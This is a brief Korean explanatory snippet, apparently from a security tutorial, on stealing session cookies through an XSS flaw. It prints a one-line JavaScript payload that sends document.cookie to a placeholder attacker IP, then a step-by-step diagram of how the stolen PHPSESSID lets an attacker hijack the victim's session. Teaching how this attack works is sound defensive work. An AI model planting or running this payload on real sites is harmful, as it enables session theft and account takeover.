...
```
new Image().src = "http://1.2.3.4/steal.php?cookie=" + document.cookie;
```
...
```
① 사이트에 XSS(HTML/스크립트 삽입) 취약점이 있음
        ↓
② 공격자가 그 취약점으로 이 코드를
   "피해자가 보게 될 페이지" 안에 몰래 심어둠
        ↓
③ 피해자가 그냥 그 페이지를 평소처럼 열기만 함 (아무것도 클릭 안 해도 됨)
        ↓
④ 브라우저가 페이지를 렌더링하면서 이 스크립트도 자동 실행
   → document.cookie로 피해자의 쿠키(세션ID 포함)를 읽음
   → "이미지 불러오기" 동작에 슬쩍 실어서 공격자 서버로 GET 요청 발사
        ↓
⑤ 피해자는 전혀 모름. 공격자 서버 로그에 PHPSESSID가 찍힘
        ↓
⑥ 공격자가 그 PHPSESSID를 자기 브라우저에 넣으면 → 로그인 없이 피해자로 둔갑
```
